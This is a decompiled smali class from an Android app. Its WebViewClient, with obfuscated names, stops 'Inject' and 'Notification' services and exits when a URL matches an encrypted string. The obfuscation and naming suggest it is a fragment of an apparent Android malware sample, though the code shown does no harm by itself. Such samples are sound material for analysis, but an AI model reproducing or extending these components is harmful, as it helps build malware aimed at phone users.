.class Lcompse/refact/st/upsssss/fsafsdfsfsdfsfsdfsd;
.super Landroid/webkit/WebViewClient;


# instance fields
.field final synthetic fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/Inject$mainActivity;


# direct methods
.method constructor <init>(Lcompse/refact/st/upsssss/Inject$mainActivity;)V
    .locals 0

    iput-object p1, p0, Lcompse/refact/st/upsssss/fsafsdfsfsdfsfsdfsd;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/Inject$mainActivity;

    invoke-direct {p0}, Landroid/webkit/WebViewClient;-><init>()V

    return-void
.end method


# virtual methods
.method public shouldOverrideUrlLoading(Landroid/webkit/WebView;Ljava/lang/String;)Z
    .locals 5

    const/4 v4, 0x1

    const-string v0, "&\u001d:\u0019=SaF>\u0005/\u0010`\u000e!\u0006)\u0005+G-\u0006#F/\u0019>\u001a"

    invoke-static {v0}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcompse/refact/st/upsssss/fsafsdfsfsdfsfsdfsd;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/Inject$mainActivity;

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lcompse/refact/st/upsssss/fsafsdfsfsdfsfsdfsd;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/Inject$mainActivity;

    const-class v3, Lcompse/refact/st/upsssss/Notification;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Lcompse/refact/st/upsssss/Inject$mainActivity;->stopService(Landroid/content/Intent;)Z

    iget-object v0, p0, Lcompse/refact/st/upsssss/fsafsdfsfsdfsfsdfsd;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/Inject$mainActivity;

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lcompse/refact/st/upsssss/fsafsdfsfsdfsfsdfsd;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/Inject$mainActivity;

    const-class v3, Lcompse/refact/st/upsssss/InjectProcess;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Lcompse/refact/st/upsssss/Inject$mainActivity;->stopService(Landroid/content/Intent;)Z

    invoke-static {v4}, Ljava/lang/System;->exit(I)V

    :cond_0
    return v4
.end method
